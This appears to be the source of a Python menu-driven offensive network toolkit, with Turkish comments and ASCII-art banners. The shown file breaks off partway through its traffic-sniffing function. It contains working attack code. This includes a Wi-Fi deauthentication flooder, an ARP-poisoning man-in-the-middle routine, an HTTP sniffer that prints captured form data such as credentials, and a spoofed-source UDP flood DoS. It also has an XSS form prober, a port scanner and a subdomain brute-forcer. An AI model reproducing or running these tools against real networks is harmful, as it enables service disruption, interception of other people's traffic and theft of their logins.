import socket
import threading
import time
from queue import Queue
from scapy_http import http
import nmap3
import scapy.all as scapy
import random
import requests
import whois
from bs4 import BeautifulSoup as Bs
from urllib.parse import urljoin
import sys
import subprocess
import os
from scapy.layers import dot11, eap

# WIFI CRACKER WILL BE HERE SOON


"""
.----------------.  .-----------------.  .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || | ____  _____  | || |     _____    | || |      __      | || |     ______   | |
| | |_   ___  |  | || ||_   \|_   _| | || |    |_   _|   | || |     /  \     | || |   .' ___  |  | |
| |   | |_  \_|  | || |  |   \ | |   | || |      | |     | || |    / /\ \    | || |  / .'   \_|  | |
| |   |  _|  _   | || |  | |\ \| |   | || |      | |     | || |   / ____ \   | || |  | |         | |
| |  _| |___/ |  | || | _| |_\   |_  | || |     _| |_    | || | _/ /    \ \_ | || |  \ `.___.'\  | |
| | |_________|  | || ||_____|\____| | || |    |_____|   | || ||____|  |____|| || |   `._____.'  | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
"""


class WifiScanner:

    def __init__(self):
        self.networks = {}
        self.list = []
        self.target = []
        self.queue = Queue()

    def monitorMode(self, interface):
        """cihanız monitor moda gecmesini sağlar."""
        subprocess.call(f"airmon-ng start {interface}", shell=True)
        os.system("clear")

    def analyzePacket(self, packet):
        """cevredeki wifi ağlarını listeler ve işler"""
        if packet.haslayer(dot11.Dot11Beacon):
            bssid = packet[dot11.Dot11].addr2
            ssid = packet[dot11.Dot11Elt].info.decode()
            signal = packet[dot11.RadioTap].dBm_AntSignal
            stats = packet[dot11.Dot11Beacon].network_stats()
            channel = stats.get("channel")
            crypto = stats.get("crypto").pop()
            if len(crypto) < 8:
                crypto += (8 - len(crypto)) * " "
            self.networks = {"ID": 0, "BSSID": bssid, "SSID": ssid, "CHANNEL": channel, "SIGNAL": signal,
                             "CRYPTO": crypto}
            # listede eleman yoksa
            if not self.list:
                self.list.append(self.networks)
            # listede 1 eleman veya daha fazla eleman varsa ve başa dönmüsse listeyi boşalt
            elif len(self.list) > 1 and self.list[0].get("BSSID") == bssid:
                time.sleep(7)
                self.list.clear()
            equal = False
            # listede 2 veya 2 den daha fazla eleman var ise aynı olanları güncelle ve çık farkl olanı ise aklında tut
            for i in range(0, len(self.list)):
                tempBssid = self.list[i].get("BSSID")
                if bssid == tempBssid:
                    equal = True
                    self.list[i].update(SSID=ssid, CHANNEL=channel, SIGNAL=signal, CRYPTO=crypto)
                    break
                elif bssid != tempBssid:
                    equal = False
            # eğer yeni gelecek eleman farklı ise ve listede en az 1 eleman var ise ekle
            if not equal and len(self.list) > 0:
                self.list.append(self.networks)

    def channelChanger(self, interface, event):
        """cihazın kanal değerini 0.5 saniyede bir değiştirir"""
        channel = 1
        while event.is_set():
            os.system(f"iwconfig {interface} channel {channel}")
            channel = channel % 14 + 1
            time.sleep(0.5)

    def packetPrinter(self, event):
        """çevredeki wifi ağlarını ekrana yazdırır."""
        while event.is_set():
            title = "ID        BSSID       CHANNEL  SIGNAL   CRYPTO            SSID\n"
            leng = len(self.list)
            os.system("clear")
            for i in range(0, leng):
                signal = self.list[i].get("SIGNAL")
                for j in range(0, leng):
                    if signal > self.list[j].get("SIGNAL"):
                        temp = self.list[i]
                        self.list[i] = self.list[j]
                        self.list[j] = temp

            for i in range(0, leng):
                if i == 0:
                    print(title)
                    self.list[i].update(ID=i + 1)
                    print("{})  {}\t{}\t{}\t{}       {}".format(self.list[i].get("ID"), self.list[i].get("BSSID"),
                                                                self.list[i].get("CHANNEL"),
                                                                self.list[i].get("SIGNAL"),
                                                                self.list[i].get("CRYPTO"),
                                                                self.list[i].get("SSID")))
                elif 0 < i < 9:
                    self.list[i].update(ID=i + 1)
                    print("{})  {}\t{}\t{}\t{}       {}".format(self.list[i].get("ID"), self.list[i].get("BSSID"),
                                                                self.list[i].get("CHANNEL"),
                                                                self.list[i].get("SIGNAL"),
                                                                self.list[i].get("CRYPTO"),
                                                                self.list[i].get("SSID")))
                else:
                    self.list[i].update(ID=i + 1)
                    print("{}) {} \t{} \t{} \t{}       {}".format(self.list[i].get("ID"), self.list[i].get("BSSID"),
                                                                  self.list[i].get("CHANNEL"),
                                                                  self.list[i].get("SIGNAL"),
                                                                  self.list[i].get("CRYPTO"),
                                                                  self.list[i].get("SSID")))

            self.queue.put(self.list)
            time.sleep(0.5)

    def start(self, interface):

        try:
            run_event = threading.Event()
            run_event.set()
            printer = threading.Thread(target=self.packetPrinter, args=(run_event,))
            printer.start()
            channelChanger = threading.Thread(target=self.channelChanger, args=(interface, run_event))
            channelChanger.start()
            scapy.sniff(prn=self.analyzePacket, iface=interface)
            while True:
                self.target = self.queue.get()
        except KeyboardInterrupt:
            run_event.clear()
            printer.join()
            channelChanger.join()
            return self.target


class FindStations:

    def __init__(self, bssid):
        self.bssid = bssid
        self.networks = {}
        self.list = []
        self.target = []
        self.queue = Queue()

    def packetAnalyzer(self, packet):
        """herhangi bir ağa bağlı olan cihazları listeler"""
        num = 0
        equal = False
        if packet.haslayer(dot11.Dot11FCS) and packet.type == 2 and not packet.getlayer(eap.EAPOL):
            station = packet.getlayer(dot11.Dot11FCS).addr2
            bssid = packet.getlayer(dot11.Dot11FCS).addr3
            signal = packet[dot11.RadioTap].dBm_AntSignal
            if self.bssid == bssid and station != bssid:
                self.networks = {"ID": num, "BSSID": bssid, "STATION": station, "SIGNAL": signal}
                if not self.list:
                    self.list.append(self.networks)

                for i in range(0, len(self.list)):
                    if self.list[i].get("STATION") == station:
                        self.list[i].update(SIGNAL=signal)
                        equal = True
                        break
                    else:
                        equal = False
                if len(self.list) > 0 and not equal:
                    self.list.append(self.networks)

    def printer(self, event):
        """herhangi bir ağa bağlı cihazları ekrana yazdırır"""
        while event.is_set():
            title = "ID        BSSID             STATION            SIGNAL"
            leng = len(self.list)
            os.system("clear")
            for i in range(0, leng):
                signal = self.list[i].get("SIGNAL")
                for j in range(0, leng):
                    if signal > self.list[j].get("SIGNAL"):
                        temp = self.list[i]
                        self.list[i] = self.list[j]
                        self.list[j] = temp

            for i in range(0, leng):
                if i == 0:
                    print(title)
                    self.list[i].update(ID=i + 1)
                    print("{})  {}\t{}\t{}".format(self.list[i].get("ID"), self.list[i].get("BSSID"),
                                                   self.list[i].get("STATION"), self.list[i].get("SIGNAL")))
                else:
                    self.list[i].update(ID=i + 1)
                    print("{})  {}\t{}\t{}".format(self.list[i].get("ID"), self.list[i].get("BSSID"),
                                                   self.list[i].get("STATION"), self.list[i].get("SIGNAL")))
            self.queue.put(self.list)
            time.sleep(0.5)

    def start(self):
        try:
            run_event = threading.Event()
            run_event.set()
            printer = threading.Thread(target=self.printer, args=(run_event,))
            printer.start()
            scapy.sniff(prn=self.packetAnalyzer, iface="wlan0mon")
            while True:
                self.target = self.queue.get()
        except KeyboardInterrupt:
            run_event.clear()
            printer.join()
            return self.target


class DeauthAttack:

    def __init__(self, bssid, ssid, channel, interface, count):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.interface = interface
        self.count = count

    def createDeauthPacket(self):
        """deauth paketi oluşturur"""
        dt11 = dot11.Dot11(addr1=self.ssid, addr2=self.bssid, addr3=self.bssid)
        deauthPacket = dot11.RadioTap() / dt11 / dot11.Dot11Deauth(reason=7)
        return deauthPacket

    def sendDeauthPackets(self, deauthPacket):
        """deauth paketini yollar."""
        scapy.sendp(deauthPacket, inter=0.01, count=self.count, iface=self.interface, verbose=False)

    def changeChannel(self):
        """deauth paketinin gönderme işlenminin başarılı olması için kanalı değiştirir"""
        os.system(f"iwconfig {self.interface} channel {self.channel}")

    def start(self):
        self.changeChannel()
        deauthPacket = self.createDeauthPacket()
        self.sendDeauthPackets(deauthPacket)


class GetNetworkInformation:
    """Bu class kullanıcıların network bilgilerini almaya yarar"""

    def getInterfaces(self):
        """Network interfacelerini listeler"""
        interfaces = scapy.get_if_list()
        return interfaces

    def showInterfaces(self, interfaces):
        """Network interfacelerini ekrana yazdırır"""
        for enum, value in enumerate(interfaces, 1):
            print("\n{}) {}".format(enum, value))

    def getMacAddress(self, interface):
        """interfacedeki mac adresini çeker"""
        return scapy.get_if_hwaddr(interface)

    def getRouterIp(self):
        """modemin ip adresini alır"""
        return scapy.conf.route.route("0.0.0.0")[2]

    def getRouterMac(self, routerIp):
        """modemin ip adresine göre mac adresini alır"""
        return scapy.getmacbyip(routerIp)


class NetworkElements:
    """Bu class kullanıcının bulunduğu ağdaki aygıtları tarar"""

    def __init__(self, ipRange):
        """Hangi ip aralığına göre tarama yapılacağını belirtir."""
        self.ipRange = ipRange

    def createArpPacket(self):
        """verilen ip aralığına için arp paketi oluşturur."""
        return scapy.ARP(pdst=self.ipRange)

    def createBroadCastPacket(self):
        """paket yayını yapmak için broadcast paketleri oluşturur"""
        return scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    def sendCombinedPacket(self):
        """Arp ve brodcast paketleri birleştirilerek ağa gönderilir"""
        return scapy.srp(self.createBroadCastPacket() / self.createArpPacket(), timeout=1, verbose=False)

    def showLiveIp(self):
        """gönderdiğimiz paketlerden alınan cevaplara göre çalışmakta olan ip adreslerinin bilgileri alınır"""
        (packet, loss) = self.sendCombinedPacket()
        target = self.createTargetList(packet, list())
        return target

    def getOsInformation(self, targetIP):
        """Taranan ip'nin os bilgilerini getirir"""
        nmap = nmap3.Nmap()
        result = nmap.nmap_os_detection(targetIP)
        if result:
            return result[0].get("name")
        else:
            return "Unable to determined"

    def createTargetList(self, packet, listObject, i=0):
        """taranan iplerin mac adresleri sistem bilgileri gibi bilgiler ekrana yazdırılır"""
        long = len(packet)
        if i == 0:
            print("\tIp Address\t\tMac Address\t\tSystem Information")
        if i < long:
            targetIp = packet[i][1].psrc
            targetMac = packet[i][1].hwsrc
            sysInformation = self.getOsInformation(targetIp)
            targetDict = {"ip": targetIp, "mac": targetMac, "sys": sysInformation}
            listObject.append(targetDict)
            print("{})".format(i + 1),
                  "\t" + listObject[i].get("ip") + "\t\t" + listObject[i].get("mac") + "\t" + listObject[i].get("sys"))
            i += 1
            return self.createTargetList(packet, listObject, i)
        else:
            return listObject


class PortScanner:
    """Bu class verilen ip adresinde port taraması yapar"""

    def __init__(self, ip, startPort, endPort, processorPeriod):
        self.ip = ip
        self.startPort = startPort
        self.endPort = endPort
        self.period = processorPeriod
        socket.setdefaulttimeout(0.25)
        self.printLock = threading.Lock()
        self.queue = Queue()

    def portScan(self, port):
        """açık olan portlara bağlanmaya çalışır"""
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connection = skt.connect((self.ip, port))
            with self.printLock:
                print("{}.port is Open".format(port))
            connection.close()
        except:
            pass

    def threadProcessorCallBack(self):
        while True:
            port = self.queue.get()
            self.portScan(port)
            self.queue.task_done()

    def processorPeriod(self):
        """aynı anda kaç tane thread çalışacak onu belirler"""
        for processor in range(self.period):
            worker = threading.Thread(target=self.threadProcessorCallBack)
            worker.daemon = True
            worker.start()

    def putPortsInQueue(self):
        """taranması istenen port aralığını queue ya koyar"""
        for port in range(self.startPort, self.endPort):
            self.queue.put(port)

    def start(self):
        """port taramasını başlatır"""
        self.putPortsInQueue()
        self.processorPeriod()
        self.queue.join()


class MiddleMan:

    def __init__(self, targetIp, userMac, routerIp, routerMac):
        self.targetIp = targetIp  # kullanıcının saldırmak istediği ip adresini girmesi gerekmektedir
        self.userMac = userMac  # saldırı yapacak olan yani kullanıcının mac adresini biz almalıyız
        self.routerIp = routerIp  # saldırı yapılıcak olan ağın modeminin ip adresini default olarak biz almalıyız
        self.routerMac = routerMac  # saldırı yapılacak olan ağın modeminin mac adresini default olarak biz almalıyız
        # interface default alıyor

    def createArpPackets(self):
        """hedef ip ye ve modem ip ye zehirli arp packetleri gönderir."""
        targetPacket = scapy.ARP(op=2, pdst=self.targetIp, hwdst=self.userMac, psrc=self.routerIp)
        routerPacket = scapy.ARP(op=2, pdst=self.routerIp, hwdst=self.userMac, psrc=self.targetIp)

        return targetPacket, routerPacket

    def sendRestorePackets(self):
        """hedef ip ve modemin eski haline dönmesi için onarıcı paketler gonderir"""
        restorePacketForTarget = scapy.ARP(op=2, pdst=self.targetIp, hwdst=self.userMac, psrc=self.routerIp,
                                           hwsrc=self.routerMac)
        restorePacketForRouter = scapy.ARP(op=2, pdst=self.routerIp, hwdst=self.userMac, psrc=self.targetIp,
                                           hwsrc=self.routerMac)
        scapy.send(restorePacketForTarget, verbose=False, count=16)
        scapy.send(restorePacketForRouter, verbose=False, count=16)

    def sendArpPacket(self):
        """arp paketlerinin sürekli gönderilmesini sağlar"""
        target, router = self.createArpPackets()
        print("Sending ARP poisoned packets...('Press ctrl+c to stop')\n")
        try:
            while True:
                scapy.send(target, verbose=False)
                scapy.send(router, verbose=False)
                time.sleep(5)

        except KeyboardInterrupt:
            self.sendRestorePackets()


class Sniff:
    """Bu class ağ trafiğini dinlemeyi sağlar"""

    def __init__(self, interface):
        self.interface = interface

    def analyzePackets(self, packet):
        """Ağda gönderilen packetleri inceler ve bulduğu sonuçları ekrana yazdırır."""
        try:
            if packet.haslayer(http.HTTPRequest):
                httpLayer = packet.getlayer(http.HTTPRequest)
                print("Host = {}".format(self.stringDesign(httpLayer.getfieldval("Host"))))
                print("Path = {}".format(self.stringDesign(httpLayer.getfieldval("Path"))))
                print("Method = {}".format(self.stringDesign(httpLayer.getfieldval("Method"))))
                print("Referer = {}".format(self.stringDesign(httpLayer.getfieldval("Referer"))))
                print("Connection = {}".format(self.stringDesign(httpLayer.getfieldval("Connection"))))
                if packet.haslayer(scapy.Raw):
                    rawLayer = packet.getlayer(scapy.Raw)
                    control = self.stringDesign(rawLayer.load)
                    if control is not None:
                        print("Load = {}".format(self.stringDesign(rawLayer.load)))
                print("\n********************************************************\n")
        except:
            pass

    def stringDesign(self, field):

        element = str(field).split("'")
        if element[1].find("&") != -1:
            a = element[1].split("&", 2)
            print(str(a[0]) + "\n" + str(a[1]) + "\n")
            # loadın içinde şifre ve kullanıcı adı varsa ekrana yazdır
            return None
        else:
            # loadın içinde şifre ve kullanıcı adı yoksa orjınali döndür
            return element[1]

    def listenPacket(self):
        scapy.sniff(iface=self.interface, store=False, prn=self.analyzePackets)


class DOSAttack:
    """Bu class belirlenen ip adresinine çoklu port ve çoklu ip saldırısı uygular"""

    def __init__(self, targetIp):
        self.targetIp = targetIp
        self.packetLock = threading.Lock()
        self.portQueue = Queue()
        self.randomData = random._urandom(1201)

    @staticmethod
    def createIpAddress():
        """rastegele ip adresleri oluşturur."""
        return "{}.{}.{}.{}".format(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254),
                                    random.randint(1, 254))

    def putPortsInQueue(self):
        """Bilinen tüm portları queue nun içine koyar."""
        for port in range(1, 65535):
            self.portQueue.put(port)

    def processorPeriod(self):
        """Aynı anda kaç tane thread çalışacak onu belirler"""
        for processor in range(100):
            worker = threading.Thread(target=self.threadProcessorCallBack)
            worker.daemon = True
            worker.start()

    def threadProcessorCallBack(self):
        while True:
            port = self.portQueue.get()
            self.sendPackets(port)
            self.portQueue.task_done()

    def sendPackets(self, port):
        """Farklı ip adreslerinden ve farklı portlardan hedef ip adresine paket gönderir."""
        try:
            with self.packetLock:
                ipPacket = scapy.IP(src=self.createIpAddress(), dst=self.targetIp)
                udpPacket = scapy.UDP(sport=port, dport=135)
                combinedPacket = ipPacket / udpPacket
                scapy.send(combinedPacket / scapy.Raw(load=self.randomData), verbose=False)
        except:
            pass

    def start(self):
        try:
            print("\nDOS Attack started!!!('Press ctrl+c to stop')")
            while True:
                self.putPortsInQueue()
                self.processorPeriod()
                self.portQueue.join()
        except:
            pass


class SubDomainScan:
    """Bu class belirlenen sitenin subdomainlerini bulur"""

    def __init__(self, domain):
        self.domain = domain
        self.queue = Queue()
        self.prinLock = threading.Lock()

    def wordList(self):
        """subdomain taraması için subdomain wordlistini açar ve işler"""
        file = open("subdomains.txt")
        wordlist = file.read()
        return wordlist.splitlines()

    def putSubDomainInQueue(self, wordList):
        """subdomain wordlistindeki elemanları queue ya koyar"""
        for line in wordList:
            self.queue.put(line)

    def threadCallBackFunction(self):
        while True:
            subDomain = self.queue.get()
            self.findSubDomains(subDomain)
            self.queue.task_done()

    def processPeriod(self):
        """Aynı anda kaç tane Thread çalışacağını belirler."""
        for process in range(100):
            worker = threading.Thread(target=self.threadCallBackFunction)
            worker.daemon = True
            worker.start()

    def findSubDomains(self, subDomain):
        """domain'in başına subdomainleri ekleyerek bağlanmaya çalışır bağlantı hatası almazsa ekrana yazdırır."""
        url = f"http://{subDomain}.{self.domain}"

        try:
            requests.get(url)
        except requests.ConnectionError:
            pass
        else:
            with self.prinLock:
                print(url)

    def start(self):

        self.putSubDomainInQueue(self.wordList())
        self.processPeriod()
        self.queue.join()


class WhoIsLookup:
    """Bu classta domain sahibi ile ilgili bilgiler listelenir"""

    def __init__(self, domain):
        self.domain = domain

    def query(self):
        try:
            domain = whois.query(self.domain)
            print("Domain Name = " + domain.name)
            print("Registrar = " + domain.registrar)
            print("Creation Date = " + str(domain.creation_date))
            print("Expiration Date = " + str(domain.expiration_date))
            print("Last Updated = " + str(domain.last_updated))
        except:
            pass


class XSSScanner:
    """Bu classta hedef sayfada XSS açığı bulunmaya çalışılır."""

    def __init__(self, url):
        self.url = url
        if self.url.find("http") == -1:
            self.url = "http://" + self.url

    def getAllForms(self):
        """hedef sayfanın html dosyasında form tagları aranır"""
        soup = Bs(requests.get(self.url).content, "html.parser")
        return soup.find_all("form")

    def getFormIngredient(self, form):
        """form taglarının içindeki bilgiler kaydedilir"""
        ingredient = {}
        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        # tüm input typeları
        for inputTag in form.find_all("input"):
            inputType = inputTag.attrs.get("type", "text")
            inputName = inputTag.attrs.get("name")
            inputs.append({"type": inputType, "name": inputName})

        ingredient["action"] = action
        ingredient["method"] = method
        ingredient["inputs"] = inputs
        return ingredient

    def createNewForm(self, ingredient, url, value):
        """kaydedilen form tagının value değeri script kodu ile değiştirelek yeni bir submit isteği oluşturulur."""
        targetUrl = urljoin(url, ingredient["action"])
        inputs = ingredient["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            inputName = input.get("name")
            inputValue = input.get("value")
            if inputName and inputValue:
                data[inputName] = inputValue

        if ingredient["method"] == "post":
            return requests.post(targetUrl, data=data)
        else:
            return requests.get(targetUrl, params=data)

    def scanXSS(self):
        """gonderilen submit formuna karşılık alınan cevapta XSS açığı görülürse ekrana yazdırılır."""
        try:
            forms = self.getAllForms()
            jsCode = "<Script>alert('xss detected!')</scripT>"
            vulnerable = False
            for form in forms:
                ingredient = self.getFormIngredient(form)
                newRequest = self.createNewForm(ingredient, self.url, jsCode).content.decode()
                if jsCode in newRequest:
                    print("XSS detected on {}".format(self.url))
                    vulnerable = True
            if not vulnerable:
                print("XSS vulnerability not found")
        except:
            pass


class MainScreen:
    END = '\033[1;37;0m'

    def cover(self):
        a = """

        `........    `...     `..    `..           `.                `..   
        `..          `. `..   `..    `..          `. ..           `..   `..
        `..          `.. `..  `..    `..         `.  `..         `..       
        `......      `..  `.. `..    `..        `..   `..        `..       
        `..          `..   `. `..    `..       `...... `..       `..       
        `..          `..    `. ..    `..      `..       `..       `..   `..
        `........    `..      `..    `..     `..         `..        `....  


        """

        b = """
           . .                   . .                .                      . .                      . .    
        .+'|=|`+.             .+'|=|`+.             |`+.                .+'|=|`+.                .+'|=|`+. 
        |  | `+.|             |  | `+ |             |  |                |  | |  |                |  | `+.| 
        |  |=|`.              |  |  | |             |  |                |  |=|  |                |  |      
        |  | `.|              |  |  | |             |  |                |  | |  |                |  |      
        |  |    .             |  |  | |             |  |                |  | |  |                |  |    . 
        |  | .+'|             |  |  | |             |  |                |  | |  |                |  | .+'| 
        `+.|=|.+'             `+.|  |.|             |.+'                `+.| |..|                `+.|=|.+' 



        """

        c = """
         _______                     __   _                     _____                          _______                          _______
         |______                     | \  |                       |                            |_____|                          |      
         |______                     |  \_|                     __|__                          |     |                          |_____

        """

        d = """

         ___                _   _              _                 _____                 ___   
        (  _`\             ( ) ( )            (_)               (  _  )               (  _`\ 
        | (_(_)            | `\| |            | |               | (_) |               | ( (_)
        |  _)_             | , ` |            | |               |  _  |               | |  _ 
        | (_( )            | |`\ |            | |               | | | |               | (_( )
        (____/'            (_) (_)            (_)               (_) (_)               (____/'

        """

        e = """

            ______                                _   __                                ____                                       ___                                       ______
           / ____/                               / | / /                               /  _/                                      /   |                                     / ____/
          / __/                                 /  |/ /                                / /                                       / /| |                                    / /     
         / /___                                / /|  /                               _/ /                                       / ___ |                                   / /___   
        /_____/                               /_/ |_/                               /___/                                      /_/  |_|                                   \____/   

        """

        g = """

        ######    ### ###    ####       #        ##### 
         ##  #     ### #      ##       ###      ##   # 
         ##        ### #      ##       ###      ##     
         ####      # ###      ##       # #      ##     
         ##        # ###      ##      #####     ##     
         ##  #     #  ##      ##      #  ##     ##   # 
        ######    ### ##     ####    ### ###     ##### 

        """

        h = """
        ooooooo_____________ooo____oo_____________oooo________________ooo___________________oooo___
        oo__________________oooo___oo______________oo_______________oo___oo_______________oo____oo_
        oooo________________oo_oo__oo______________oo______________oo_____oo_____________oo________
        oo__________________oo__oo_oo______________oo______________ooooooooo_____________oo________
        oo__________________oo___oooo______________oo______________oo_____oo______________oo____oo_
        ooooooo_____________oo____ooo_____________oooo_____________oo_____oo________________oooo___
        ___________________________________________________________________________________________

        """

        k = """

        _______        __    _        ___         _______        _______ 
        |       |      |  |  | |      |   |       |   _   |      |       |
        |    ___|      |   |_| |      |   |       |  |_|  |      |       |
        |   |___       |       |      |   |       |       |      |       |
        |    ___|      |  _    |      |   |       |       |      |      _|
        |   |___       | | |   |      |   |       |   _   |      |     |_ 
        |_______|      |_|  |__|      |___|       |__| |__|      |_______|


        """

        j = """

         _______        _             _________       _______        _______ 
        (  ____ \      ( (    /|      \__   __/      (  ___  )      (  ____ \
        | (    \/      |  \  ( |         ) (         | (   ) |      | (    \/
        | (__          |   \ | |         | |         | (___) |      | |      
        |  __)         | (\ \) |         | |         |  ___  |      | |      
        | (            | | \   |         | |         | (   ) |      | |      
        | (____/\      | )  \  |      ___) (___      | )   ( |      | (____/\
        (_______/      |/    )_)      \_______/      |/     \|      (_______/

        """

        p = """

          _______         _____  ___           __                 __              ______   
         /"     "|       (\"   \|"  \         |" \               /""\            /" _  "\  
        (: ______)       |.\\   \    |        ||  |             /    \          (: ( \___) 
         \/    |         |: \.   \\  |        |:  |            /' /\  \          \/ \      
         // ___)_        |.  \    \. |        |.  |           //  __'  \         //  \ _   
        (:      "|       |    \    \ |        /\  |\         /   /  \\  \       (:   _) \  
         \_______)        \___|\____\)       (__\_|_)       (___/    \___)       \_______) 

        """

        z = """

        .----------------.  .-----------------.  .----------------.  .----------------.  .----------------.
        | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
        | |  _________   | || | ____  _____  | || |     _____    | || |      __      | || |     ______   | |
        | | |_   ___  |  | || ||_   \|_   _| | || |    |_   _|   | || |     /  \     | || |   .' ___  |  | |
        | |   | |_  \_|  | || |  |   \ | |   | || |      | |     | || |    / /\ \    | || |  / .'   \_|  | |
        | |   |  _|  _   | || |  | |\ \| |   | || |      | |     | || |   / ____ \   | || |  | |         | |
        | |  _| |___/ |  | || | _| |_\   |_  | || |     _| |_    | || | _/ /    \ \_ | || |  \ `.___.'\  | |
        | | |_________|  | || ||_____|\____| | || |    |_____|   | || ||____|  |____|| || |   `._____.'  | |
        | |              | || |              | || |              | || |              | || |              | |
        | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
         '----------------'  '----------------'  '----------------'  '----------------'  '----------------'

        """
        screenList = [a, b, c, d, e, g, h, k, j, p, z]
        return screenList[random.randint(0, len(screenList) - 1)]

    def color(self):
        PURPLE = '\033[1;35;48m'
        CYAN = '\033[1;36;48m'
        BOLD = '\033[1;37;48m'
        BLUE = '\033[1;34;48m'
        GREEN = "\033[1;32m"
        YELLOW = '\033[1;33;48m'
        RED = "\033[91m"
        BLACK = '\033[1;30;48m'
        colorList = [PURPLE, CYAN, BOLD, BLUE, GREEN, YELLOW, RED, BLACK]
        return colorList[random.randint(0, len(colorList) - 1)]


class Main:

    def scriptList(self):
        scripts = ["Wifi Scanner And Deauth Attack(wifi cracker will be here soon)", "Network Scanner",
                   "Middle Man Attack", "Sniffing Network Traffic", "DOS Attack",
                   "Sub Domain Scanner",
                   "XSS Scanner", "Who is Lookup", "Exit"]

        return scripts

    def choose(self, scripts):
        os.system("clear")
        print("\n")
        screen = MainScreen()
        print(screen.color() + screen.cover() + screen.END + "\n")
        for enum, value in enumerate(scripts, start=1):
            print(screen.color() + f"{enum}) {value}\n" + screen.END)
        try:
            selection = int(input("\nPlease choose an operation: "))
        except:
            print("\nSomething went wrong please try again with right values.\n")
            self.start()
        return selection

    def returnMenu(self):
        choose = int(input("\nFor main menu press 1\nFor exit press 2\nchoose:"))
        if choose == 1:
            self.start()
        elif choose == 2:
            self.exit()

    def subMenu(self, selection):
        color = MainScreen()
        if selection == 1:
            os.system("clear")
            print(color.color())
            self.wifiScanner()
            print(color.END)
        elif selection == 2:
            os.system("clear")
            print(color.color())
            targetIp = input("\nPlease enter a target('Example:192.168.1.0/24'): ")
            print("\n")
            self.networkScanner(targetIp)
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 3:
            os.system("clear")
            print(color.color())
            self.mitmAttack()
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 4:
            os.system("clear")
            print(color.color())
            self.sniffAttack()
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 5:
            os.system("clear")
            print(color.color())
            target = input("\nPlease enter a target ip or target host: ")
            self.dosAttack(target)
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 6:
            os.system("clear")
            print(color.color())
            target = input("\nPlease enter a target host: ")
            self.subDomainScan(target)
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.color())
        elif selection == 7:
            os.system("clear")
            print(color.color())
            target = input("\nPlease enter a target url: ")
            self.xssScan(target)
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 8:
            os.system("clear")
            print(color.color())
            domain = input("\nPlease Enter a domain: ")
            self.whois(domain)
            print("\n***************************************************************************\n")
            self.returnMenu()
            print(color.END)
        elif selection == 9:
            self.exit()
        else:
            print("\nSomething went wrong please try again with right values.\n")
            self.start()

    def start(self):
        while True:
            scripts = self.scriptList()
            selection = self.choose(scripts)
            self.subMenu(selection)

    def wifiScanner(self):
        print("\nDid you put the wifi card in monitor mode?\n\n1) Yes\n2) No")
        control = int(input())
        info = GetNetworkInformation()
        interfaces = info.getInterfaces()
        wifiScanner = WifiScanner()

        if control == 1:
            info.showInterfaces(interfaces)
            choose = int(input("\nPlease choose a interface: "))
            choosenInterface = interfaces[choose - 1]
            target = wifiScanner.start(choosenInterface)

        elif control == 2:
            info.showInterfaces(interfaces)
            choose = int(input("\nChoose the interface you want to put into monitor mode: "))
            choosenInterface = interfaces[choose - 1]
            wifiScanner.monitorMode(choosenInterface)
            interfaces = info.getInterfaces()
            info.showInterfaces(interfaces)
            new_choose = int(input("\nPlease choose a interface: "))
            choosenInterface = interfaces[new_choose - 1]
            target = wifiScanner.start(choosenInterface)

        targetId = int(input("Choose a target: "))
        for i in target:
            if i.get("ID") == targetId:
                bssid = i.get("BSSID")
                channel = i.get("CHANNEL")
                break
            else:
                print("target does not found")

        findStation = FindStations(bssid)
        deauthTarget = findStation.start()
        choosenID = int(input("\nPlease choose a target for deauthentication: "))
        for i in deauthTarget:
            if i.get("ID") == choosenID:
                bssid = i.get("BSSID")
                ssid = i.get("STATION")
                break
        count = int(input("\nplease specify the number of deauth packages you want to send(we suggest 10): "))
        deauth = DeauthAttack(bssid, ssid, channel, choosenInterface, count)
        deauth.start()

    def networkScanner(self, targetIp):
        ping = NetworkElements(targetIp)
        ping.showLiveIp()

    def mitmAttack(self):

        info = GetNetworkInformation()
        interfaces = info.getInterfaces()
        info.showInterfaces(interfaces)
        choose = int(input("\nPlease choose a interface: "))
        choosenInterface = interfaces[choose - 1]
        userMac = info.getMacAddress(choosenInterface)
        gatewayIp = info.getRouterIp()
        gatewayMac = info.getRouterMac(gatewayIp)

        targetIp = input(
            "\nif you want to determined the target by manually, please enter a target, \notherwise please press the enter so we can run the network scanner: ")
        if targetIp == "":
            ip = gatewayIp.split(".", 3)
            ip[3] = "0/24"
            dot = "."
            newIp = ip[0] + dot + ip[1] + dot + ip[2] + dot + ip[3]
            ping = NetworkElements(newIp)
            targetList = ping.showLiveIp()
            choose = int(input("\nPlease choose a target: "))
            target = targetList[choose - 1].get("ip")
            print("\nYour Mac Address = {}\n".format(userMac))
            print("Gateway Ip Address = {}\n".format(gatewayIp))
            print("Gateway Mac Address = {}\n".format(gatewayMac))
            middle = MiddleMan(target, userMac, gatewayIp, gatewayMac)
            subprocess.call("gnome-terminal --tab -q -- bash -c 'python3 eniac.py; bash'", shell=True)
            middle.sendArpPacket()
        else:
            print("Your Mac Address = {}\n".format(userMac))
            print("Gateway Ip Address = {}\n".format(gatewayIp))
            print("Gateway Mac Address = {}\n".format(gatewayMac))
            middle = MiddleMan(targetIp, userMac, gatewayIp, gatewayMac)
            subprocess.call("gnome-terminal --tab -q -- bash -c 'python3 eniac.py; bash'", shell=True)
            middle.sendArpPacket()

    def sniffAttack(self):
        info = GetNetworkInformation()
